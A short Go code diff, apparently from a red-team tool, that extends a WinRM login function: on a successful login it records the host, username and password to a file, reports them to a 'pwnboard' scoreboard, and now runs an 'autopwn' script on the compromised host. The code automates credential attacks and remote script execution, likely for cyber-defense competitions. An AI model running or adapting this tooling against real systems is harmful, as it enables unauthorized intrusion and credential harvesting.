@@ -7,6 +7,7 @@ import (
 	"time"
 
 	"github.com/masterzen/winrm"
+	"github.com/opt/red-script/internal/autopwn"
 	"github.com/opt/red-script/internal/files"
 	"github.com/opt/red-script/internal/pwnboard"
 )
@@ -19,7 +20,7 @@ const DEFAULT_PORT int = 5985
 // Function that uses provided host, user, and password to attempt to log
 //	into WinRM and execute a simple command. If login is sucessful, the function
 //	will also attempt to alert pwnboard.
-func Connect(host, user, password string, wg *sync.WaitGroup) {
+func Connect(host, user, password string, scriptPath string, wg *sync.WaitGroup) {
 	defer wg.Done()
 
 	// Setting the port that WinRM will be accessed from
@@ -48,8 +49,12 @@ func Connect(host, user, password string, wg *sync.WaitGroup) {
 		return
 	}
 
-	fmt.Println("Successful WinRM connection @", host)
+	fmt.Println("Successful WinRM connection @" + host)
 
 	files.WriterChan <- fmt.Sprintf("winrm:'%s':'%s':'%s'\n", host, user, password)
 	pwnboard.SendUpdate(host, fmt.Sprintf("winrm:'%s':'%s':Default creds", user, password))
+
+	if scriptPath != "" {
+		autopwn.WinRMAutopwn(host, user, password, scriptPath)
+	}
 }
